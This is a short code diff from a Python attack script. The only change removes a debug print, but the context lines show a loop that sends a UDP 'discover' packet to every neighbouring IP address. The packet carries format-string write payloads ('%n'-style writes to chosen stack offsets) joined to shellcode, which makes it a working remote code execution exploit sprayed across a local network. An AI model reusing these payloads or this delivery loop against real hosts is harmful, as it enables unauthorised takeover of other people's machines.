@@ -96,7 +96,6 @@ def run():
     for ip in neighbors:
         print(f'IP: {ip}')
         p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln'+shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
-        print(p)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(p, (ip, port))
         s.close()
